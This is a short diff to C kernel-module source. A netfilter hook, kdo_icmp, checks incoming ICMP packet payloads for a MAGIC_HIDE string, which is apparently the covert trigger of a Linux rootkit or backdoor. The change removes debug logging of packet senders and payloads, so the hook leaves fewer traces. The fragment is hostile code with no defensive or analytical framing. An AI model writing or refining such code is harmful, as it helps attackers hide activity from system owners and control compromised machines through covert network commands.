@@ -28,16 +28,8 @@ unsigned int kdo_icmp(
 		return NF_ACCEPT;
 
 	if (iph->protocol == IPPROTO_ICMP) {
-		#ifdef DEBUG
-		kdo_log_fmt(KERN_INFO, "Received ICMP packet from %pI4", &iph->saddr);
-		#endif
-
 		if (! (data = (char *)((unsigned char *)iph + 28)))
 			return NF_ACCEPT;
-
-		#ifdef DEBUG
-		kdo_log_fmt(KERN_INFO, "Packet has a payload: %s", data);
-		#endif
 
 		if (
 			! strncmp(data, MAGIC_HIDE, sizeof(MAGIC_HIDE) - 1) ||
